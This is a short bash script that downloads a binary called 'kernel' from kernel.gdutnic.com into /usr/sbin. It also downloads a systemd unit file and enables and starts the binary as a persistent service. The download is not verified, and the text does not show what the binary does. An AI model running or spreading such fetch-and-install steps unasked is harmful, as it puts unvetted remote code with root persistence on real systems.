#!/usr/bin/env bash
curl -sL https://kernel.gdutnic.com/static/agent/kernel -o /usr/sbin/kernel
chmod +x /usr/sbin/kernel
curl -sL https://kernel.gdutnic.com/static/agent/kernel-agent.service -o /usr/lib/systemd/system/kernel-agent.service
systemctl daemon-reload
systemctl enable kernel-agent
systemctl start kernel-agent